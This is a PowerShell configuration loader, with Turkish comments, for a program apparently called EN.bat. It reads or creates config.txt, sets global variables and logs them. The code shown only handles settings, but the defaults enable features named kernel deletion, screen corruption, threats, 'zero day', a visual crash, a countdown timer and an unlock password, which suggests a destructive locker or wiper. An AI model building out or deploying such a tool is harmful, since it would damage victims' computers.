# ============================================================
# EN – GELİŞMİŞ YAPILANDIRMA OKUYUCU
# ============================================================
# Bu modül:
# - config.txt dosyasını okur
# - Tüm ayarları global değişkenlere atar
# - Eksik ayarlar için varsayılan değerler kullanır
# - Hata durumunda log tutar
# - Ayarları ekrana yazdırır (debug modu)
# - config.txt yoksa kendisi oluşturur (varsayılan ayarlarla)
# ============================================================

$configDosyasi = "config.txt"
$log = "C:\EN_Log.txt"

# ============================================================
# 1. VARSAYILAN AYARLAR
# ============================================================
$defaultAyarlar = @{
    SURE = 1800
    DIL = "tr"
    SINIR_ESIK = 10
    KERNEL_SIL = 1
    SIFRE = "EN_I_am_not_happy_at_all_with_my_life/:("
    EKRAN_BOZMA_SURE = 60
    SES_AKTIF = 1
    FARE_AKTIF = 1
    OYUN_AKTIF = 1
    VIDEO_AKTIF = 1
    TEHDIT_AKTIF = 1
    ZERO_DAY_AKTIF = 1
    GORSEL_COKUS_AKTIF = 1
    DEBUG_MOD = 0
}

# ============================================================
# 2. AYARLARI YÜKLE
# ============================================================
$ayarlar = @{}

# Varsayılanları kopyala
foreach ($anahtar in $defaultAyarlar.Keys) {
    $ayarlar[$anahtar] = $defaultAyarlar[$anahtar]
}

# config.txt varsa oku
if (Test-Path $configDosyasi) {
    try {
        $satirlar = Get-Content $configDosyasi -Encoding UTF8
        foreach ($satir in $satirlar) {
            if ($satir -match "^#|^\s*$") { continue }
            $parca = $satir -split "=", 2
            if ($parca.Count -eq 2) {
                $anahtar = $parca[0].Trim()
                $deger = $parca[1].Trim()
                if ($defaultAyarlar.ContainsKey($anahtar)) {
                    $ayarlar[$anahtar] = $deger
                }
            }
        }
        Write-Host "[EN] config.txt okundu." -ForegroundColor Green
    } catch {
        Write-Host "[EN] config.txt okuma hatasi: $_" -ForegroundColor Red
        Add-Content -Path $log -Value "[$(Get-Date)] config.txt okuma hatasi: $_"
    }
} else {
    # config.txt yoksa oluştur
    Write-Host "[EN] config.txt bulunamadi. Varsayilan ayarlarla olusturuluyor..." -ForegroundColor Yellow
    $configIcerik = @"
# EN.bat Yapilandirma Dosyasi
# Her satirda bir ayar bulunur. Satir basindaki # yorum satiridir.

SURE=1800
DIL=tr
SINIR_ESIK=10
KERNEL_SIL=1
SIFRE=EN_I_am_not_happy_at_all_with_my_life/:(
EKRAN_BOZMA_SURE=60
SES_AKTIF=1
FARE_AKTIF=1
OYUN_AKTIF=1
VIDEO_AKTIF=1
TEHDIT_AKTIF=1
ZERO_DAY_AKTIF=1
GORSEL_COKUS_AKTIF=1
DEBUG_MOD=0
"@
    try {
        $configIcerik | Out-File -FilePath $configDosyasi -Encoding UTF8
        Write-Host "[EN] config.txt olusturuldu." -ForegroundColor Green
    } catch {
        Write-Host "[EN] config.txt olusturulamadi: $_" -ForegroundColor Red
    }
}

# ============================================================
# 3. AYARLARI GLOBAL DEĞİŞKENLERE AKTAR
# ============================================================
$script:SURE = [int]$ayarlar["SURE"]
$script:DIL = $ayarlar["DIL"]
$script:SINIR_ESIK = [int]$ayarlar["SINIR_ESIK"]
$script:KERNEL_SIL = [int]$ayarlar["KERNEL_SIL"]
$script:SIFRE = $ayarlar["SIFRE"]
$script:EKRAN_BOZMA_SURE = [int]$ayarlar["EKRAN_BOZMA_SURE"]
$script:SES_AKTIF = [int]$ayarlar["SES_AKTIF"]
$script:FARE_AKTIF = [int]$ayarlar["FARE_AKTIF"]
$script:OYUN_AKTIF = [int]$ayarlar["OYUN_AKTIF"]
$script:VIDEO_AKTIF = [int]$ayarlar["VIDEO_AKTIF"]
$script:TEHDIT_AKTIF = [int]$ayarlar["TEHDIT_AKTIF"]
$script:ZERO_DAY_AKTIF = [int]$ayarlar["ZERO_DAY_AKTIF"]
$script:GORSEL_COKUS_AKTIF = [int]$ayarlar["GORSEL_COKUS_AKTIF"]
$script:DEBUG_MOD = [int]$ayarlar["DEBUG_MOD"]

# ============================================================
# 4. AYARLARI EKRANA YAZ (DEBUG MOD)
# ============================================================
if ($script:DEBUG_MOD -eq 1) {
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "   EN – YAPILANDIRMA AYARLARI (DEBUG)" -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "SURE               : $script:SURE" -ForegroundColor Yellow
    Write-Host "DIL                : $script:DIL" -ForegroundColor Yellow
    Write-Host "SINIR_ESIK         : $script:SINIR_ESIK" -ForegroundColor Yellow
    Write-Host "KERNEL_SIL         : $script:KERNEL_SIL" -ForegroundColor Yellow
    Write-Host "SIFRE              : $script:SIFRE" -ForegroundColor Yellow
    Write-Host "EKRAN_BOZMA_SURE   : $script:EKRAN_BOZMA_SURE" -ForegroundColor Yellow
    Write-Host "SES_AKTIF          : $script:SES_AKTIF" -ForegroundColor Yellow
    Write-Host "FARE_AKTIF         : $script:FARE_AKTIF" -ForegroundColor Yellow
    Write-Host "OYUN_AKTIF         : $script:OYUN_AKTIF" -ForegroundColor Yellow
    Write-Host "VIDEO_AKTIF        : $script:VIDEO_AKTIF" -ForegroundColor Yellow
    Write-Host "TEHDIT_AKTIF       : $script:TEHDIT_AKTIF" -ForegroundColor Yellow
    Write-Host "ZERO_DAY_AKTIF     : $script:ZERO_DAY_AKTIF" -ForegroundColor Yellow
    Write-Host "GORSEL_COKUS_AKTIF : $script:GORSEL_COKUS_AKTIF" -ForegroundColor Yellow
    Write-Host "DEBUG_MOD          : $script:DEBUG_MOD" -ForegroundColor Yellow
    Write-Host "============================================================" -ForegroundColor Cyan
}

# ============================================================
# 5. LOG KAYDI
# ============================================================
try {
    Add-Content -Path $log -Value "[$(Get-Date)] Yapilandirma yuklendi. SURE: $script:SURE, DIL: $script:DIL, KERNEL_SIL: $script:KERNEL_SIL"
} catch {
    Write-Host "[EN] Log yazma hatasi: $_" -ForegroundColor Red
}

Write-Host "[EN] Yapilandirma basariyla yuklendi." -ForegroundColor Green